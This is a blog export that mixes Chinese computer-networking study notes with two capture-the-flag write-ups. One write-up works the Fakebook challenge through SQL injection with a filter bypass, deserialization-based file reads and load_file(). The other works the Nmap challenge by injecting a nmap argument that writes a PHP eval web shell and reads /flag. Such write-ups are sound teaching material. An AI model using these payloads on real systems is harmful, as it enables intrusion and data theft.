<li>上面的动作对于AS之间的路由来说只不过多了一个点而已</li>
<li>AS内部路由也可以采用层次性路由</li>
</ul></li>
</ul>
<p><strong>性能</strong>：</p>
<ul>
<li>Intra-AS：关注性能。越快路由越好</li>
<li>Inter-AS：策略比性能更重要</li>
</ul>
<h1 id="sdn控制平面">3. SDN控制平面</h1>
<h2 id="基础">3.1. 基础</h2>
<p>SDN架构以及数据平面的内容在上一章介绍了。</p>
<p>SDN控制器里的元件</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220606192129.png" /></p>
<p>上图中SDN控制自上而下分为三层，依次为：</p>
<ul>
<li>网络控制应用的界面层：抽象API</li>
<li>网络范围的状态管理层（分布式数据库）：网络链路、交互设备和服务的状态</li>
<li>通信层：SDN控制器和SDN交换机之间进行通信</li>
</ul>
<p>SDN有一个比较好的协议：OpenFlow协议</p>
<ul>
<li>控制器和SDN交换机交互的协议</li>
<li>采用TCP来交互报文，因此可以通过SSL加密</li>
<li>3中OpenFlow报文类型：
<ul>
<li>控制器-交换机</li>
<li>交换机-控制器（异步工作方式）</li>
<li>对称</li>
</ul></li>
</ul>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220606192519.png" /></p>
<p>控制器-交换机报文（一些关键的）：</p>
<ul>
<li>特性：控制器查询交换机特性，交换机应答</li>
<li>配置：交换机查询/设置交换机的配置</li>
<li>修改状态：增加/删除/修改OpenFlow表中的流表</li>
<li>packet-out：控制器可以将分组通过特定的端口发出</li>
</ul>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220606192706.png" /></p>
<p>交换机-控制器的报文（一些关键的）：</p>
<ul>
<li>分组进入：将分组传给控制器</li>
<li>流移除：在交换机上删除流表项</li>
<li>端口状态：通告控制器端口的变化</li>
</ul>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220606192835.png" /></p>
<blockquote>
<p>网络管理员不需要直接通告创建/发送流表来编程交换机，而是采用在控制器上的app自动运算和配置</p>
</blockquote>
<h2 id="sdn数据控制平面交互的例子">3.2.
SDN：数据/控制平面交互的例子</h2>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220606192931.png" /></p>
<ol type="1">
<li>S1向控制器通告链路失效（端口状态报文）</li>
<li>SDN控制器接收报文，更新链路状态信息</li>
<li>Dijkstra路由算法应用被调用</li>
<li>Dijkstra路由算法访问控制器中的网络拓扑信息、链路状态信息，重新计算路由</li>
<li>链路状态路由app和SDN控制器中流表计算元件交互，计算出新的流表</li>
<li>控制器采用OpenFlow在交换机上安装新的流表</li>
</ol>
<h2 id="控制器例子">3.3. 控制器例子</h2>
<p>OpenDaylight(ODL)控制器</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220606193348.png" /></p>
<p>ONOS控制器</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220606193329.png" /></p>
<h2 id="sdn面临的挑战">3.4. SDN面临的挑战</h2>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220606193406.png" /></p>
<h1 id="icmp">4. ICMP</h1>
<p>ICMP：Internet Control Message Protocol</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220606193551.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220606193629.png" /></p>
<p>源主机发送一些列UDP段给目标主机：</p>
<ul>
<li>TTL=1的</li>
<li>TTL=2的</li>
<li>TTL=3的</li>
<li>...</li>
<li>直到TTL=n到达。路由器抛弃数据报，向源发送一个ICMP报文(type 11, code
0)，报文中包括了路由器名字和IP地址</li>
</ul>
<h1 id="网络管理和snmp">5. 网络管理和SNMP</h1>
<h2 id="网络管理">5.1. 网络管理</h2>
<p>什么是网络管理：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220606193905.png" /></p>
<p>网络管理的5大功能：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220606193929.png" /></p>
<p>网络管理架构：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220606193945.png" /></p>
<h2 id="snmp">5.2. SNMP</h2>
<p>SNMP：Simple Network Management Protocol。SNMP协议的两种模式：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220606194016.png" /></p>
<p>报文类型：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220606194032.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220606194043.png" /></p>
]]></content>
      <categories>
        <category>计算机基础</category>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
        <tag>计算网络教程 自顶向下方法</tag>
        <tag>B站中科大计网</tag>
      </tags>
  </entry>
  <entry>
    <title>网鼎杯 2018 Fakebook</title>
    <url>/2022/03/21/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018%20Fakebook/</url>
    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入环境，有 <code>login</code> 和 <code>join</code> 两个按钮，先用
admin
弱口令测试了一下，发现登陆失败，就尝试注册一个账号。这里需要注意的是
blog 那一栏应该有特殊的验证，我这里使用 <code>123.blog</code>
成功注册。</p>
<p>登录成功后发现username可以点击，点击之后 url 出现了一个 no
参数，因此测试一下是否存在 sql 注入。 <img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321162039.png" /></p>
<h1 id="第一次sql注入">第一次sql注入</h1>
<p>先用如下payload测试，发现注入点的闭合方式为空。接下来就是常规的注入过程。
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=1=1</span><br><span class="line">?no=1=2</span><br></pre></td></tr></table></figure></p>
<p>然后 fuzz 以下，发现没有字符被过滤（可能是我的字典太小了）</p>
<h2 id="获取字段数">获取字段数</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=1 order by 4</span><br></pre></td></tr></table></figure>
<h2 id="测试显示位">测试显示位</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1 union select 1,2,3,4</span><br></pre></td></tr></table></figure>
<p>发现这个payload被过滤了。但是空格，
逗号，union，select都没有被过滤。经过多次测试，发现后台应该检测的是<code>union select</code>，那么payload设置为
<code>union/**/select</code> 即可绕过。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1 union/**/select 1,2,3,4</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321162640.png" /></p>
<p>上面的信息很丰富：</p>
<ul>
<li><strong>Notice</strong>: unserialize(): Error at offset 0 of 1 bytes
in <strong>/var/www/html/view.php</strong> on line <strong>31</strong>
存在反序列化</li>
<li>显示位为 2</li>
<li>地址为：<strong>/var/www/html/view.php</strong></li>
</ul>
<h2 id="常规注入">常规注入</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. ?no=-1 union/**/select 1,database(),3,4</span><br><span class="line">2. ?no=-1 union/**/select 1,user(),3,4</span><br><span class="line">3. ?no=-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()</span><br><span class="line">4. ?no=-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#x27;users&#x27;</span><br><span class="line">5. ?no=-1 union/**/select 1,no,3,4 from fakebook.users</span><br></pre></td></tr></table></figure>
<p>获得的结果依次是： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fakebook</span><br><span class="line">root@localhost</span><br><span class="line">users</span><br><span class="line">no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</span><br><span class="line">1</span><br><span class="line">hdf</span><br><span class="line">3c9909afec25354d551dae21590bb26e38d53f2173b8d3dc3eee4c047e7ab1c1eb8b85103e3be7ba613b31bb5c9c36214dc9f14a42fd7a2fdb84856bca5c44c2</span><br><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;hdf&quot;;s:3:&quot;age&quot;;i:123;s:4:&quot;blog&quot;;s:8:&quot;123.blog&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<p>接下来就不知道该如何是好了，如果是单纯的 sql 注入，应该会显示出
flag，这明显是信息收集的还不够。</p>
<h1 id="信息收集">信息收集</h1>
<p>想到 <code>robots.txt</code> 看一下 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /user.php.bak</span><br></pre></td></tr></table></figure></p>
<p>发现存在着备份文件泄露，下载打开得到如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = curl_getinfo(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>（这里也说明，blog是有特殊的格式要求的。）</p>
<p>发现确实存在序列化的过程，注意到 <code>function get($url)</code> 和
<code>public function getBlogContents ()</code>
可以读取文件内容，并且上面已经得到文件路径了，那么猜测flag所在的文件路径为：<code>/var/www/html/flag.php</code>。</p>
<p>编写如下脚本： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;hdf&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;file:///var/www/html/flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> UserInfo;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>得到： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;hdf&quot;;s:3:&quot;age&quot;;i:20;s:4:&quot;blog&quot;;s:29:&quot;/var/www/html/flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<p>那么接下来问题就是哪里传入我们构造的序列化后的字符串。</p>
<h1 id="第二次sql注入">第二次sql注入</h1>
<p>注意力回到： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1 union/**/select 1,2,3,4</span><br></pre></td></tr></table></figure></p>
<p>注意到4个字段顺序：<code>no,username,passwd,data</code>
，猜测分别对应 1，2，3，4。并且 data
字段返回的是一个序列化后的过程。因此，做一个假设：</p>
<p><strong>后台的工作模式：先用 no 进行第一次查询，然后得到对应的
<code>no,username,passwd,data</code> 信息。接着将 data
字段进行反序列后，获取对应地址的内容。</strong></p>
<p>因此，将上述序列化后的字符带入得到如下payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1 union/**/select 1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;hdf&quot;;s:3:&quot;age&quot;;i:20;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;</span><br></pre></td></tr></table></figure></p>
<p>查看源码发现： <img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321165151.png" /></p>
<p>点击得到 flag。 <img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321165208.png" /></p>
<h1 id="其他注入方法">其他注入方法</h1>
<p>注意到，获取用户信息的时候得到的是：<code>root@localhost</code>，root权限非常大，因此可以尝试直接读取flag文件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1 union/**/select 1,load_file(&#x27;/var/www/html/flag.php&#x27;),3,4</span><br></pre></td></tr></table></figure>
<p>查看源码，直接获得 flag <img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321165450.png" /></p>
<h1 id="总结">总结</h1>
<p>本题考的应该是两次注入的过程，第一次常规，第二次反序列化。不过平常刷题中也要注意用户的权限问题，这里的用户权限我确实没想到。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>网鼎杯 2020 朱雀组 Nmap</title>
    <url>/2022/04/11/%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84%20Nmap/</url>
    <content><![CDATA[<p>题目地址：<a
href="https://buuoj.cn/challenges#%5B网鼎杯%202020%20朱雀组%5DNmap">网鼎杯
2020 朱雀组 Nmap</a></p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入环境发现如下界面：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220411162826.png" /></p>
<p>根据<code>nmap</code>猜测，这是后台调用了<code>nmap</code>脚本来执行我们在输入框输入的。经过测试发现许多符号在执行的时候都会在前面添加一个<code>\</code>，下图中的<code>;</code>前面就被添加了。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220411162937.png" /></p>
<p>因此猜测后台使用了<code>escapeshellarg + escapeshellcmd</code>。</p>
<p>查看页面源码发现在最下面发现一个注释<code>flag is in /flag</code>。</p>
<h1 id="解题">解题</h1>
<p>关于<code>escapeshellarg + escapeshellcmd</code>的知识可以参考我之前写的<a
href="https://hdfzzf.icu/2022/03/22/BUUCTF%202018%20Online%20Tool/?highlight=online">BUUCTF
2018 Online Tool</a></p>
<p>这里有两种解法：</p>
<ol type="1">
<li>方法_1</li>
</ol>
<p>直接使用<a
href="https://hdfzzf.icu/2022/03/22/BUUCTF%202018%20Online%20Tool/?highlight=online">BUUCTF
2018 Online
Tool</a>中的payload，提示<code>Hacker...</code>。猜测是过滤了<code>php</code>，因此修改为如下payload：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&lt;?= eval($_POST[&quot;shell&quot;]);?&gt; -oG shell.phtml &#x27;</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p><code>&lt;?php</code>可以用<code>&lt;?=</code>代替
<strong>短标签</strong></p>
</blockquote>
<p>虽然提示了<code>Host maybe down</code>，但是已经被执行了。直接访问</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220411164005.png" /></p>
<p>然后用蚁剑连接，flag文件在根目录。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220411164108.png" /></p>
<ol start="2" type="1">
<li>方法_2</li>
</ol>
<p>nmap命令可以利用<code>-iL</code>读取文件中的内容，然后进行扫描。我们再将扫描的结果用<code>-oN</code>写入另一个文件，然后直接访问该文件即可。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1 &#x27;-iL /flag -oN exp.txt &#x27;</span><br></pre></td></tr></table></figure>
<p>也是会提示<code>Host maybe down</code>，但是可以直接访问。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220411164248.png" /></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>RCE</tag>
        <tag>nmap命令</tag>
      </tags>
  </entry>
  <entry>
    <title>第 6 章 链路层和局域网</title>
    <url>/2022/06/09/%E7%AC%AC%206%20%E7%AB%A0%20%E9%93%BE%E8%B7%AF%E5%B1%82%E5%92%8C%E5%B1%80%E5%9F%9F%E7%BD%91/</url>
    <content><![CDATA[<p>这章就是整个计算机网络 top to down
的最后一章了，当然还有许多内容，只不过最核心的都在这6章。</p>
<span id="more"></span>
<h1 id="概述">1. 概述</h1>
<p>通过之前的学习，我们知道了一个分组如何从一个子网的网关路由器到另一个子网网关路由器，但是还不知道如何将分组从网关路由器发送到目标主机，这就是本章节的内容。</p>
<h2 id="节点的连接方式">1.1. 节点的连接方式</h2>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220607220546.png" /></p>
<ul>
<li>Q：一个子网中的若干节点是如何连接的？</li>
</ul>
<p>我们知道，连接分为两种形式：</p>
<ul>
<li>点到点连接</li>
<li>多点连接</li>
</ul>
<p>如果一个子网中只有5个节点，那么完全可以采用点到点连接的方式，最后连接成一个5角星。一旦子网中的节点数量上去，比如说50个，那么点到点之间的连接就很困难了，每个节点都要与其他的49个相连。显然不切实际。因此，子网中通常采用多点连接。</p>
<p>需要区分一下两种情况：</p>
<ol type="1">
<li><p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220607224610.png" /></p></li>
<li><p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220607224714.png" /></p></li>
</ol>
<p>图1是点到点连接；图2是多点连接。<strong>点到点指的是两点之间有专属的边，多点连接指的是多个连通过公共的边连接在一起。</strong></p>
<p>点到点连接的特点：</p>
<ul>
<li>链路属于连接的双方，因此不存在竞争</li>
<li>没必要寻址（我发的分组，一定就是你收，没有其他人了）</li>
<li>不易扩展（N个节点，链路数量为：<span class="math inline">\(\frac
{n(n+1)}{2} ➡ O(n^2)\)</span>）</li>
</ul>
<p>多点连接的特点：</p>
<ul>
<li>易于扩展（1个节点只需要一根线连接到共享介质就可以和其他节点连接到一起。链路数量一般为
<span class="math inline">\(O(n)\)</span>）</li>
<li>存在竞争/碰撞（多个节点一起发送，结果在公共链路上碰到一起了，结果谁都发不出去）</li>
<li>需要寻址（我发的分组大家都能收得到，因此需要标注是发给谁的）</li>
</ul>
<p>WAN一般范围比较大，因此采取点到点连接（一根电缆从西安绕道上海然后到杭州，最后到福州，这是不切实际），实现简单，只需要封装和解封装；</p>
<ul>
<li>此时，链路距离远（延迟大），带宽大（跨越这么远的距离不可能说连接一个带宽很小的链路吧）
-&gt;
带宽延迟积大。如果采用多点连接：一旦竞争发生，代价会比较大（本来延迟就大，发生碰撞之后可能就直接超时了）。当然也可以采取协调的方式，但是协调也是需要发送信息的，发送信息就需要时间，因此协调时间也很长</li>
</ul>
<p>LAN因为范围较小，一般采用多点连接方式：</p>
<ul>
<li>连接节点方便</li>
<li>连接到共享介质上，就可以连接所有其他节点</li>
</ul>
<p>但是需要采用一定的方式来实现链路层的复杂功能：</p>
<ol type="1">
<li>多点接入：协调各阶段对共享介质的访问和使用</li>
<li>竞争方式：冲突之后的协调</li>
<li>令牌方式：令牌产生，占有和释放等</li>
</ol>
<h2 id="链路层服务">1.2. 链路层服务</h2>
<p>先介绍一些术语：</p>
<ol type="1">
<li>主机、路由器、网桥和交换机都是节点：nodes</li>
<li>沿着通信路径，连接相邻节点的通信信道称为链路：links
<ul>
<li>有线链路</li>
<li>无线链路</li>
<li>局域网，共享性链路</li>
</ul></li>
<li>第二层协议数据单元：帧，frame。数据报封装之后形成帧</li>
</ol>
<p><strong>数据链路层负责从一个节点通过链路将帧中的数据报发送到相邻的物理节点</strong>。而网络层是端到端，传输层在网络层的基础上实现进程到进程。</p>
<h3 id="上下文">1.2.1. 上下文</h3>
<p>数据报（分组）在不同的链路上以不同的链路协议传送，比方说：</p>
<ul>
<li>第一跳：以太网</li>
<li>中间链路：帧中继链路</li>
<li>最后一跳：802.11</li>
</ul>
<p><strong>不同的链路协议提供不同的服务。比如说：如果物理链路不太可靠，那么就需要在链路层提供可靠的服务，亡羊补牢。</strong></p>
<p>上面的不同链路的传输可以类比为（学生）从高校回家：</p>
<ul>
<li>首先，坐地铁到达机场</li>
<li>然后坐飞机到达福州</li>
<li>从福州机场坐出租回到家</li>
</ul>
<p>上面的例子中：</p>
<ul>
<li>数据报=学生</li>
<li>不同的交通段=不同的通信链路</li>
<li>交通模式=链路层协议</li>
<li>票务代理（如何买票）=路由算法</li>
</ul>
<h3 id="具体服务">1.2.2. 具体服务</h3>
<p>链路层提供的最重要的一个服务，任何链路层协议都提供的服务：<strong>成帧</strong>。</p>
<ul>
<li>将数据报封装在帧中，加上帧头、帧尾</li>
</ul>
<p>还有一个服务也是链路层协议所共有的服务：<strong>流量控制</strong>。如果AB双方，A在链路上发送的速度太快，B的网卡来不及接收数据，那么就会导致分组被丢弃。因此，需要通过流量控制来匹配双方的速度。</p>
<p>如果采用的是共享性介质（多点连接），那么还需要提供：<strong>链路接入和寻址</strong></p>
<ul>
<li>信道接入，获得信道访问权</li>
<li>此时，需要在帧头部使用<strong>MAC地址</strong>来表示源和目的（寻址）</li>
</ul>
<p>除了上述两个服务外，链路层还<strong>可能提供</strong>：<strong>可靠的数据传输</strong>，包括：</p>
<ol type="1">
<li>错误检测</li>
<li><strong>差错纠正</strong></li>
</ol>
<p>错误检测在TCP详细说过。接收方检测到错误会将分组丢弃，然后告知发送端让其重传。差错纠正，接收端检查到<strong>bit错误</strong>之后，可以通过其他没有错误的bit来纠正错误。</p>
<p><strong>这里存在一个问题：传输层已经提供了可靠传输了，为什么链路层也需要提供可靠服务呢？</strong></p>
<p>首先需要明确，链路层的可靠服务是可选的：</p>
<ul>
<li>如果物理链路比较可靠，那么链路层就不提供可靠服务</li>
<li>如果物理链路不可靠，那么链路就提供可靠服务</li>
</ul>
<p>如果链路层不提供可靠服务，我们设想这么一种情况，一个分组从西安到福州，假设路过了5个路由器到达对方主机</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220608103758.png" /></p>
<p>如果分组在传输到第一个路由器的途中发生了一个bit的错误，由于路由器只有三层，所以路由器并不会检测到错误，那么这个错误的分组就会到达对方主机，然后到达传输层被TCP检测出错误，接收端丢弃该分组并通知发送方重发。</p>
<p>上述情况中，分组其实在第一个路由器就应该被丢弃然后告诉发送方重发，而不是传送到接收端才这么做。这就是链路层提供可靠服务的意义所在，在不可靠的链路上提供可靠的服务，使得错误早发现，早重传。如果链路十分可靠，那么链路层就没必要提供可靠服务了，因为出错的概率太小了，为了小概率事件使得每个分组都需要额外的时间来检测，不值当。</p>
<p>除了上面提到的服务，链路层还提供：<strong>全双工和半双工</strong></p>
<ul>
<li>半双工：链路层可以双向传输，但一次只能一个方向。如果我在接收，那么我就不能发送</li>
<li>全双工：链路层可以双向传输，并在两个方式能够同时进行。我可以接收的同时发送</li>
</ul>
<h3 id="适配器">1.2.3. 适配器</h3>
<p>链路层在每个主机、路由器、交换机的每个端口上实现。主要通过一个硬件设备
<strong>适配器(network interface card, NIC)</strong>
实现。NIC直接连接到主机的系统总线上。</p>
<blockquote>
<p>我们说的网卡就是NIC</p>
</blockquote>
<p>适配器通信过程如下：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220608105028.png" /></p>
<p>发送方：</p>
<ul>
<li>将数据包封装成帧</li>
<li>加上差错控制便阿门，实现RDT和流量控制等功能</li>
</ul>
<p>接收方：</p>
<ul>
<li>检查有无差错，执行RDT和流量控制等功能</li>
<li>将帧解封装，取出数据报交给上层</li>
</ul>
<h1 id="差错检测和纠正">2. 差错检测和纠正</h1>
<p>在发送节点，为了保护比特免受差错，使用
<strong>差错检测和纠正比特(Error Detection and Correction)</strong>
来增强数据D。监测差错的3种常见的错误：</p>
<ol type="1">
<li>奇偶校验（用来描述差错检测和纠正背后隐含的基本思想）</li>
<li>检验和（多用于运输层）</li>
<li>循环冗余检测（多用于链路层）</li>
</ol>
<p>在[[第3章 传输层#3 1 UDP校验和
checksum]]中也说明了，差错检测不是100%可靠的，但是那样的错误比较少。<strong>更长的EDC字段可以得到更好的检测和纠正错误</strong></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220608161058.png" /></p>
<blockquote>
<p>模2运算：加法不进位，减法不借位。其实就是按位异或。</p>
</blockquote>
<h2 id="奇偶校验">2.1. 奇偶校验</h2>
<h3 id="单bit奇偶校验">2.1.1. 单bit奇偶校验</h3>
<p>这种模式下，EDC字段只有1位。假设发送方需要发送的数据D：10101010，其中有4个1，</p>
<ul>
<li>奇校验：D和EDC中1的个数为奇数</li>
<li>偶校验：D和EDC中1的个数为偶数</li>
</ul>
<p>因此，如果采取奇校验，需要将EDC设置为1，最终发送的为：101010101；如果采取偶校验，需要将EDC设置为0，最终发送的为：101010100
。</p>
<p>假设采用的是偶校验，那么接收方收到的就是
101010100。然后检测一下1的个数是否为偶数即可。</p>
<p>这种方法只能够检测1bit的错误，准确来说应该是检测<strong>奇数bit的错误</strong>。可靠性不是很高，因此产生了2维的奇偶校验。</p>
<h3 id="维奇偶校验">2.1.2. 2维奇偶校验</h3>
<p>使用一个例子来说明原理：假设发送的D是
1010101011010111（共16位），将其分成i行i列，这里分为4行4列：</p>
<ol type="1">
<li>对每一行、每一列进行模2运算。每一行的结果写在j+1列的对应行，每一列的结果写在i+1行的对应列</li>
<li>如果采取偶校验，i+1行，j+1列和<span class="math inline">\(d_{i+1,
j+1}\)</span>
中1的个数位偶数；奇校验则为奇数。（下面采取的是偶校验）</li>
<li>最后的EDC为 i+j+1 位（就是i+1行，j+1列和<span
class="math inline">\(d_{i+1, j+1}\)</span> 的值按某种顺序）</li>
</ol>
<p><span class="math display">\[
\begin{array}{cccc|c}
1 &amp; 0 &amp; 1 &amp; 0 &amp; 0 \\
1 &amp; 0 &amp; 1 &amp; 0 &amp; 0 \\
1 &amp; 1 &amp; 0 &amp; 1 &amp; 1 \\
0 &amp; 1 &amp; 1 &amp; 1 &amp; 1 \\ \hline
1 &amp; 0 &amp; 1 &amp; 0 &amp; 0
\end{array}
\]</span></p>
<p>这样子接收方接收分组之后，将D拿出来分成i行i列，然后对每一行、每一列进行模2运算，看一下结果是不是和EDC中一样。</p>
<p>该方法还有一个好处就是如果只是1bit出错，能够找出是哪个bit出错了。假设发送的数据D还是
1010101011010111，但是接收方得到的D是
1010111011010111，因此，接收方那边的结果为：</p>
<p><span class="math display">\[
\begin{array}{cccc|c}
1 &amp; 0 &amp; 1 &amp; 0 &amp; 0 \\
1 &amp; 1 &amp; 1 &amp; 0 &amp; 1 \\
1 &amp; 1 &amp; 0 &amp; 1 &amp; 1 \\
0 &amp; 1 &amp; 1 &amp; 1 &amp; 1 \\ \hline
1 &amp; 1 &amp; 1 &amp; 0 &amp; 0
\end{array}
\]</span></p>
